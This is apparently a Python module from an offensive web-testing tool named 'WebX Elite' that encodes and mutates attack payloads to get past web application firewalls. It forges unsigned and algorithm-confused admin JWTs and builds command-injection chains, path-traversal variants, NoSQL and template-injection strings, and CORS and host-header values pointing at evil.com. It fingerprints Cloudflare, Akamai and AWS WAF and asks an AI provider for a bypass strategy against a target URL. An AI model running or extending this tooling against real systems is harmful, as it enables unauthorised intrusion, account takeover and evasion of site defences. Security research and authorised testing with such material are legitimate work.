# core/encoders.py - Production-Grade Enhanced Encoders for WebX Elite
import base64
import html
import hashlib
import random
import re
import string
import urllib.parse
import json
from typing import List, Dict, Any, Optional
from .ai_provider import get_ai_provider, TaskType

# Original basic encoders (preserved for compatibility)
def url_encode(payload: str) -> str:
    """URL-encodes every character in the payload."""
    return urllib.parse.quote(payload, safe='')

def html_entity_encode(payload: str) -> str:
    """HTML-encodes special characters like < > " ' &."""
    return html.escape(payload, quote=True)

def base64_encode(payload: str) -> str:
    """Base64-encodes the entire payload."""
    return base64.b64encode(payload.encode('utf-8')).decode('utf-8')

def random_case(payload: str) -> str:
    """Applies random upper/lower casing to alphabetical characters in the payload."""
    return "".join(random.choice([c.upper(), c.lower()]) for c in payload)

# Advanced evasion techniques for elite bypass capabilities
def double_url_encode(payload: str) -> str:
    """Double URL encoding for WAF bypass"""
    return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')

def unicode_encode(payload: str) -> str:
    """Unicode encoding with various representations"""
    encoded = ""
    for char in payload:
        if random.choice([True, False]):
            encoded += f"\\u{ord(char):04x}"
        else:
            encoded += char
    return encoded

def hex_encode(payload: str) -> str:
    """Hex encoding for special characters"""
    result = ""
    for char in payload:
        if char in '<>"\'&()[]{}':
            result += f"\\x{ord(char):02x}"
        else:
            result += char
    return result

def comment_injection(payload: str) -> str:
    """Inject SQL/HTML comments for evasion"""
    comments = ['/**/','/**_**/','--+','#',';%00']
    comment = random.choice(comments)
    
    # Insert comment in strategic positions
    if "'" in payload:
        payload = payload.replace("'", f"'{comment}")
    if "SELECT" in payload.upper():
        payload = payload.replace("SELECT", f"SELECT{comment}")
    
    return payload

def whitespace_evasion(payload: str) -> str:
    """Use alternative whitespace characters"""
    whitespace_chars = ['\t', '\n', '\r', '\v', '\f', '\xa0']
    result = ""
    for char in payload:
        if char == ' ':
            result += random.choice(whitespace_chars)
        else:
            result += char
    return result

def case_randomization(payload: str) -> str:
    """Advanced case randomization with preserved functionality"""
    keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'script', 'alert', 'img', 'svg']
    result = payload
    
    for keyword in keywords:
        if keyword in result.upper():
            # Create random case variation
            new_keyword = ''.join(random.choice([c.upper(), c.lower()]) for c in keyword)
            result = re.sub(keyword, new_keyword, result, flags=re.IGNORECASE)
    
    return result

def concatenation_evasion(payload: str) -> str:
    """String concatenation for SQL injection evasion"""
    if "'" in payload:
        # Split strings and concatenate
        parts = payload.split("'")
        if len(parts) > 1:
            concatenated = "'".join([f"CHAR({ord(c)})" if c else "'" for c in parts])
            return concatenated
    return payload

# ========================================
# MISSING ENCODERS FOR ADVANCED TEMPLATES
# ========================================

def xml_encode(payload: str) -> str:
    """XML entity encoding for XXE and XML injection templates"""
    xml_entities = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#x27;',
        '/': '&#x2F;'
    }
    
    result = payload
    for char, entity in xml_entities.items():
        result = result.replace(char, entity)
    
    return result

def json_encode(payload: str) -> str:
    """JSON encoding for API and GraphQL templates"""
    try:
        # Handle string values in JSON
        if isinstance(payload, str):
            return json.dumps(payload)[1:-1]  # Remove surrounding quotes
        else:
            return json.dumps(payload)
    except:
        # Fallback manual escaping
        return payload.replace('\\', '\\\\').replace('"', '\\"').replace('\n', '\\n').replace('\r', '\\r').replace('\t', '\\t')

def ldap_encode(payload: str) -> str:
    """LDAP special character encoding for LDAP injection templates"""
    ldap_chars = {
        '\\': '\\5c',
        '*': '\\2a',
        '(': '\\28',
        ')': '\\29',
        '\x00': '\\00',
        '/': '\\2f'
    }
    
    result = payload
    for char, encoded in ldap_chars.items():
        result = result.replace(char, encoded)
    
    return result

def jwt_decode(payload: str) -> str:
    """JWT token manipulation for JWT vulnerability templates"""
    try:
        # Create manipulated JWT tokens
        manipulated_tokens = []
        
        # None algorithm bypass
        header_none = {"typ": "JWT", "alg": "none"}
        body_admin = {"sub": "1234567890", "name": "Admin User", "iat": 1516239022, "role": "admin"}
        
        header_b64 = base64.b64encode(json.dumps(header_none).encode()).decode().rstrip('=')
        body_b64 = base64.b64encode(json.dumps(body_admin).encode()).decode().rstrip('=')
        
        none_token = f"{header_b64}.{body_b64}."
        
        # Algorithm confusion (RS256 to HS256)
        header_hs256 = {"typ": "JWT", "alg": "HS256"}
        header_hs256_b64 = base64.b64encode(json.dumps(header_hs256).encode()).decode().rstrip('=')
        confused_token = f"{header_hs256_b64}.{body_b64}.signature"
        
        return random.choice([none_token, confused_token, payload])
    
    except:
        return payload

def xpath_encode(payload: str) -> str:
    """XPath encoding for XPath injection templates"""
    # XPath doesn't have many special encoding needs, but we can use string functions
    xpath_evasion = [
        payload,
        f"concat('{payload[:len(payload)//2]}','{payload[len(payload)//2:]}')",
        payload.replace("'", "&#39;"),
        payload.replace('"', "&#34;")
    ]
    
    return random.choice(xpath_evasion)

def multipart_form(payload: str) -> str:
    """Multipart form encoding for file upload templates"""
    boundary = f"----WebKitFormBoundary{''.join(random.choices(string.ascii_letters + string.digits, k=16))}"
    
    multipart_data = f"""------{boundary}\r
Content-Disposition: form-data; name="file"; filename="test.txt"\r
Content-Type: text/plain\r
\r
{payload}\r
------{boundary}--"""
    
    return multipart_data

def command_injection_bypass(payload: str) -> str:
    """Command injection filter bypass techniques"""
    bypass_techniques = [
        payload,  # Original
        f";{payload}",  # Command chaining
        f"|{payload}",  # Pipe
        f"&&{payload}",  # AND
        f"||{payload}",  # OR
        f"`{payload}`",  # Backticks
        f"$({payload})",  # Command substitution
        f"$(echo {payload})",  # Echo bypass
        payload.replace(' ', '${IFS}'),  # IFS bypass
        payload.replace(' ', '\t'),  # Tab bypass
    ]
    
    return random.choice(bypass_techniques)

def path_traversal(payload: str) -> str:
    """Path traversal encoding variations"""
    variations = [
        payload,
        payload.replace('../', '....//'),  # Double slash
        payload.replace('../', '..\\'),  # Backslash
        payload.replace('../', '%2e%2e%2f'),  # URL encoded
        payload.replace('../', '%252e%252e%252f'),  # Double URL encoded
        payload.replace('../', '..%c0%af'),  # UTF-8 overlong
        payload.replace('../', '..%c1%9c'),  # UTF-8 overlong variant
    ]
    
    return random.choice(variations)

def nosql_encode(payload: str) -> str:
    """NoSQL injection encoding for MongoDB, CouchDB templates"""
    nosql_payloads = [
        payload,
        f'{{$ne: null}}',
        f'{{$gt: ""}}',
        f'{{$regex: ".*{payload}.*"}}',
        f'{{$where: "function() {{ return this.{payload} }}"}}',
        f"'; return db.getCollectionNames(); var dummy='",
        f"1'; return JSON.stringify(this); var dummy='1"
    ]
    
    return random.choice(nosql_payloads)

def ssti_encode(payload: str) -> str:
    """Server-Side Template Injection encoding variations"""
    ssti_variations = [
        payload,
        f"{{{{{payload}}}}}",  # Jinja2/Twig style
        f"<%={payload}%>",  # ERB style
        f"${{payload}}",  # Velocity style
        f"#{{payload}}",  # FreeMarker style
        payload.replace('.', "['").replace('()', "']()"),  # Bracket notation
    ]
    
    return random.choice(ssti_variations)

def cors_origin_encode(payload: str) -> str:
    """CORS origin header encoding variations"""
    cors_variations = [
        payload,
        f"https://{payload}",
        f"http://{payload}",
        f"{payload}.evil.com",
        f"evil.{payload}",
        f"{payload}%60.evil.com",
        f"{payload}\\'.evil.com",
        "null",
        "file://",
    ]
    
    return random.choice(cors_variations)

def graphql_encode(payload: str) -> str:
    """GraphQL encoding for GraphQL injection templates"""
    # GraphQL doesn't need much encoding, but we can manipulate structure
    graphql_variations = [
        payload,
        payload.replace('"', '\\"'),  # Escape quotes
        payload.replace('\n', '\\n'),  # Escape newlines
        f'query {{ {payload} }}',  # Wrap in query
        f'mutation {{ {payload} }}',  # Wrap in mutation
    ]
    
    return random.choice(graphql_variations)

def host_header_encode(payload: str) -> str:
    """Host header injection encoding"""
    host_variations = [
        payload,
        f"{payload}:80",
        f"{payload}.evil.com",
        f"evil.{payload}",
        f"{payload}%20evil.com",
        f"{payload}\\r\\nX-Forwarded-Host: evil.com",
        f"{payload}#evil.com",
    ]
    
    return random.choice(host_variations)

def deserialization_encode(payload: str) -> str:
    """Deserialization payload encoding for various languages"""
    # Basic base64 encoding for serialized objects
    try:
        encoded = base64.b64encode(payload.encode()).decode()
        return encoded
    except:
        return payload

def business_logic_encode(payload: str) -> str:
    """Business logic bypass encoding (negative numbers, edge cases)"""
    logic_variations = [
        payload,
        f"-{payload}" if payload.isdigit() else payload,  # Negative numbers
        "0" if payload.isdigit() else payload,  # Zero bypass
        "999999999" if payload.isdigit() else payload,  # Large numbers
        f"{payload}%00",  # Null byte
        f"{payload}.0" if payload.isdigit() else payload,  # Decimal
    ]
    
    return random.choice(logic_variations)

def csrf_encode(payload: str) -> str:
    """CSRF token bypass encoding"""
    csrf_variations = [
        payload,
        "",  # Empty token
        "null",
        "undefined",
        "123456",
        "invalid_token",
        payload[::-1] if payload else payload,  # Reversed
    ]
    
    return random.choice(csrf_variations)

class IntelligentEvasionEngine:
    """AI-Powered WAF Evasion Engine with Master-Level Tradecraft"""
    
    def __init__(self):
        self.basic_encoders = {
            "url-encode": url_encode,
            "html-entity-encode": html_entity_encode,
            "base64": base64_encode,
            "random-case": random_case,
        }
        
        self.advanced_encoders = {
            "double-url-encode": double_url_encode,
            "unicode-encode": unicode_encode,
            "hex-encode": hex_encode,
            "comment-injection": comment_injection,
            "whitespace-evasion": whitespace_evasion,
            "case-randomization": case_randomization,
            "concatenation-evasion": concatenation_evasion,
        }
        
        # NEW: Advanced template-specific encoders
        self.template_encoders = {
            "xml_encode": xml_encode,
            "json_encode": json_encode,
            "ldap_encode": ldap_encode,
            "jwt_decode": jwt_decode,
            "xpath_encode": xpath_encode,
            "multipart_form": multipart_form,
            "command_injection_bypass": command_injection_bypass,
            "path_traversal": path_traversal,
            "nosql_encode": nosql_encode,
            "ssti_encode": ssti_encode,
            "cors_origin_encode": cors_origin_encode,
            "graphql_encode": graphql_encode,
            "host_header_encode": host_header_encode,
            "deserialization_encode": deserialization_encode,
            "business_logic_encode": business_logic_encode,
            "csrf_encode": csrf_encode,
        }
        
        # WAF signature patterns for detection
        self.waf_signatures = {
            'cloudflare': {
                'headers': ['cf-ray', 'cf-cache-status'],
                'response_patterns': ['attention required', 'cloudflare'],
                'blocking_patterns': ['access denied', 'blocked by cloudflare']
            },
            'akamai': {
                'headers': ['akamai-ghost'],
                'response_patterns': ['reference #'],
                'blocking_patterns': ['access denied', 'akamai']
            },
            'aws_waf': {
                'headers': ['x-amzn-requestid'],
                'response_patterns': ['forbidden'],
                'blocking_patterns': ['the request could not be satisfied']
            }
        }
    
    async def detect_waf(self, response_data: Dict[str, Any]) -> Optional[str]:
        """Detect WAF type from response patterns"""
        headers = response_data.get('headers', {})
        body = response_data.get('body', '').lower()
        status = response_data.get('status', 200)
        
        for waf_type, signatures in self.waf_signatures.items():
            # Check headers
            for header_sig in signatures['headers']:
                if any(header_sig in str(header).lower() for header in headers.keys()):
                    return waf_type
            
            # Check response patterns
            if status in [403, 406, 429]:
                for pattern in signatures['blocking_patterns']:
                    if pattern in body:
                        return waf_type
        
        return None
    
    def get_encoders_for_vulnerability_type(self, vuln_type: str) -> List[str]:
        """Get recommended encoders for specific vulnerability types"""
        encoder_mappings = {
            'xss': ['html-entity-encode', 'unicode-encode', 'hex-encode'],
            'sqli': ['comment-injection', 'whitespace-evasion', 'concatenation-evasion'],
            'xxe': ['xml_encode', 'unicode-encode'],
            'jwt': ['jwt_decode', 'base64'],
            'graphql': ['graphql_encode', 'json_encode'],
            'ldap-injection': ['ldap_encode', 'unicode-encode'],
            'xpath-injection': ['xpath_encode', 'unicode-encode'],
            'nosql': ['nosql_encode', 'json_encode'],
            'ssti': ['ssti_encode', 'unicode-encode'],
            'csrf': ['csrf_encode', 'url-encode'],
            'command-injection': ['command_injection_bypass', 'unicode-encode'],
            'path-traversal': ['path_traversal', 'unicode-encode'],
            'file-upload': ['multipart_form', 'unicode-encode'],
            'cors': ['cors_origin_encode', 'url-encode'],
            'host-header-injection': ['host_header_encode', 'unicode-encode'],
            'deserialization': ['deserialization_encode', 'base64'],
            'business-logic': ['business_logic_encode', 'url-encode'],
        }
        
        return encoder_mappings.get(vuln_type, ['url-encode', 'unicode-encode'])
    
    async def generate_ai_evasion_strategy(self, waf_type: str, failed_payloads: List[str], target_url: str) -> Optional[Dict]:
        """Use AI to generate intelligent evasion strategy"""
        ai_provider = get_ai_provider()
        if not ai_provider:
            return None
        
        target_data = {
            "waf_type": waf_type or "unknown",
            "failed_payloads": failed_payloads,
            "target_url": target_url,
            "available_encoders": list(self.advanced_encoders.keys()) + list(self.template_encoders.keys())
        }
        
        result = await ai_provider.ai_request_with_fallback(
            TaskType.WAF_EVASION,
            {"target_data": str(target_data)}
        )
        
        if result and result.get("success"):
            return self._parse_ai_evasion_response(result["response"])
        
        return None
    
    def _parse_ai_evasion_response(self, ai_response: str) -> Dict:
        """Parse AI response into actionable evasion strategy"""
        strategy = {
            "recommended_encoders": [],
            "timing_strategy": "normal",
            "success_probability": 0.5,
            "custom_techniques": []
        }
        
        # Enhanced parsing logic
        all_encoders = list(self.advanced_encoders.keys()) + list(self.template_encoders.keys())
        
        for encoder in all_encoders:
            if encoder.replace('_', '-') in ai_response.lower() or encoder in ai_response.lower():
                strategy["recommended_encoders"].append(encoder)
        
        if "delay" in ai_response.lower() or "slow" in ai_response.lower():
            strategy["timing_strategy"] = "slow"
        
        # Extract probability if mentioned
        prob_match = re.search(r'(\d+)%', ai_response)
        if prob_match:
            strategy["success_probability"] = int(prob_match.group(1)) / 100
        
        return strategy
    
    def apply_intelligent_encoding(self, payload: str, evasion_strategy: Dict, vuln_type: str = None) -> List[str]:
        """Apply intelligent encoding based on AI strategy and vulnerability type"""
        encoded_payloads = [payload]  # Include original
        
        # Get vulnerability-specific encoders
        if vuln_type:
            vuln_encoders = self.get_encoders_for_vulnerability_type(vuln_type)
            for encoder_name in vuln_encoders:
                if encoder_name in self.template_encoders:
                    try:
                        encoded = self.template_encoders[encoder_name](payload)
                        encoded_payloads.append(encoded)
                    except Exception as e:
                        print(f"[-] Encoding failed for {encoder_name}: {e}")
                elif encoder_name in self.advanced_encoders:
                    try:
                        encoded = self.advanced_encoders[encoder_name](payload)
                        encoded_payloads.append(encoded)
                    except Exception as e:
                        print(f"[-] Encoding failed for {encoder_name}: {e}")
        
        # Apply AI-recommended encoders
        recommended_encoders = evasion_strategy.get("recommended_encoders", [])
        for encoder_name in recommended_encoders:
            all_encoders = {**self.advanced_encoders, **self.template_encoders}
            if encoder_name in all_encoders:
                try:
                    encoded = all_encoders[encoder_name](payload)
                    encoded_payloads.append(encoded)
                except Exception as e:
                    print(f"[-] Encoding failed for {encoder_name}: {e}")
        
        # Apply combinations for high-value targets
        if evasion_strategy.get("success_probability", 0) < 0.7:
            # Try encoder combinations
            all_encoders = {**self.advanced_encoders, **self.template_encoders}
            for encoder1 in recommended_encoders[:2]:
                for encoder2 in recommended_encoders[:2]:
                    if encoder1 != encoder2 and encoder1 in all_encoders and encoder2 in all_encoders:
                        try:
                            combined = all_encoders[encoder2](all_encoders[encoder1](payload))
                            encoded_payloads.append(combined)
                        except Exception:
                            pass
        
        return list(set(encoded_payloads))  # Remove duplicates
    
    async def get_evasion_payloads(self, original_payload: str, response_data: Dict = None, 
                                  failed_attempts: List[str] = None, vuln_type: str = None) -> List[str]:
        """Main method to get intelligently encoded payloads"""
        
        # Start with vulnerability-type specific encoding
        encoded_payloads = []
        
        if vuln_type:
            vuln_encoders = self.get_encoders_for_vulnerability_type(vuln_type)
            all_encoders = {**self.basic_encoders, **self.advanced_encoders, **self.template_encoders}
            
            for encoder_name in vuln_encoders:
                if encoder_name in all_encoders:
                    try:
                        encoded_payloads.append(all_encoders[encoder_name](original_payload))
                    except Exception:
                        pass
        
        # Add basic encoders
        for encoder_func in self.basic_encoders.values():
            try:
                encoded_payloads.append(encoder_func(original_payload))
            except Exception:
                pass
        
        # If we have response data, try intelligent evasion
        if response_data:
            waf_type = await self.detect_waf(response_data)
            
            if waf_type or failed_attempts:
                ai_strategy = await self.generate_ai_evasion_strategy(
                    waf_type, 
                    failed_attempts or [], 
                    response_data.get('url', '')
                )
                
                if ai_strategy:
                    ai_payloads = self.apply_intelligent_encoding(original_payload, ai_strategy, vuln_type)
                    encoded_payloads.extend(ai_payloads)
        
        # Add some advanced encoders by default
        for encoder_name, encoder_func in list(self.advanced_encoders.items())[:3]:  # Limit to prevent explosion
            try:
                encoded_payloads.append(encoder_func(original_payload))
            except Exception:
                pass
        
        return list(set(encoded_payloads))  # Remove duplicates

# Global intelligent evasion engine
intelligent_evasion_engine = IntelligentEvasionEngine()

# Complete encoder registry for all template types
ENCODERS = {
    **intelligent_evasion_engine.basic_encoders,
    **intelligent_evasion_engine.advanced_encoders,
    **intelligent_evasion_engine.template_encoders
}

# Enhanced function for other modules to use
async def get_intelligent_payloads(payload: str, response_data: Dict = None, 
                                  failed_attempts: List[str] = None, vuln_type: str = None) -> List[str]:
    """Get intelligently encoded payloads with AI assistance"""
    return await intelligent_evasion_engine.get_evasion_payloads(payload, response_data, failed_attempts, vuln_type)

# Utility function for template engine integration
def get_encoder_for_template(template_id: str, vuln_type: str) -> str:
    """Get the best encoder for a specific template"""
    vuln_encoders = intelligent_evasion_engine.get_encoders_for_vulnerability_type(vuln_type)
    return vuln_encoders[0] if vuln_encoders else 'url-encode'

# Template validation function
def validate_encoder_availability(encoder_names: List[str]) -> List[str]:
    """Validate that all required encoders are available"""
    available_encoders = set(ENCODERS.keys())
    missing_encoders = []
    
    for encoder in encoder_names:
        if encoder not in available_encoders:
            missing_encoders.append(encoder)
    
    return missing_encoders
